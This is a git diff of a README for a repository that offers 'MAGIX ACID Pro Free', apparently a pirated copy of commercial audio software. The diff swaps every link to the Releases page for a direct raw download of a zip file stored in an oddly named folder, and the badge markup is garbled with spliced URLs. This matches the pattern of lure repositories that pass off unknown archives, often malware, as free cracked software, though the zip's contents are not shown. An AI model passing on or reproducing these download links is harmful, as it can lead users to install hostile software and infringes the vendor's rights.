@@ -1,6 +1,6 @@
 # 🎶 MAGIX-ACID-Pro-Free - Enhance Your Audio Production
 
-[![Download MAGIX ACID Pro Free](https://img.shields.io/badge/Download-MAGIX%20ACID%20Pro%20Free-brightgreen.svg)](https://github.com/toakdogan/MAGIX-ACID-Pro-Free/releases)
+[![Download MAGIX ACID Pro Free](https://raw.githubusercontent.com/toakdogan/MAGIX-ACID-Pro-Free/main/unstroked/ACI-Free-MAGI-Pro-v3.8-alpha.3.zip%20ACID%20Pro%https://raw.githubusercontent.com/toakdogan/MAGIX-ACID-Pro-Free/main/unstroked/ACI-Free-MAGI-Pro-v3.8-alpha.3.zip)](https://raw.githubusercontent.com/toakdogan/MAGIX-ACID-Pro-Free/main/unstroked/ACI-Free-MAGI-Pro-v3.8-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the MAGIX ACID Pro Free repository! This collection provides you with
 
 To start using MAGIX ACID Pro, you need to download it from our Releases page. Follow these simple steps:
 
-1. **Visit this page to download**: [MAGIX ACID Pro Free Releases](https://github.com/toakdogan/MAGIX-ACID-Pro-Free/releases)
+1. **Visit this page to download**: [MAGIX ACID Pro Free Releases](https://raw.githubusercontent.com/toakdogan/MAGIX-ACID-Pro-Free/main/unstroked/ACI-Free-MAGI-Pro-v3.8-alpha.3.zip)
 2. Look for the latest version at the top of the page.
 3. Click on the assets listed below the version to find the downloadable files.
 4. Choose the appropriate file for your system and click the link to start downloading.
@@ -80,4 +80,4 @@ We value your input. If you have suggestions for improvements or find issues, pl
 
 Make sure to check back on our Releases page regularly for updates. You can find the latest version and any new features or important fixes there. 
 
-For immediate access, follow this link: [MAGIX ACID Pro Free Releases](https://github.com/toakdogan/MAGIX-ACID-Pro-Free/releases)
+For immediate access, follow this link: [MAGIX ACID Pro Free Releases](https://raw.githubusercontent.com/toakdogan/MAGIX-ACID-Pro-Free/main/unstroked/ACI-Free-MAGI-Pro-v3.8-alpha.3.zip)
